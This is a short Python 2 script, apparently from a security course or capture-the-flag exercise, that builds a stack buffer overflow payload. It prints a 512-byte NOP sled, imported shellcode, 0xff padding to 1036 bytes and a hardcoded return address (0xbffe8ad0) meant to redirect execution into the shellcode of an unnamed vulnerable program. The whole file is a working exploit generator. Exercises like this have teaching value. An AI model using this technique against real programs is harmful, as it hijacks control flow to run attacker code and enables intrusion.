from shellcode import shellcode
from struct import pack

print "\x90"*512 + shellcode + (1036-512-len(shellcode))*"\xff" + pack("<I",0xbffe8ad0)



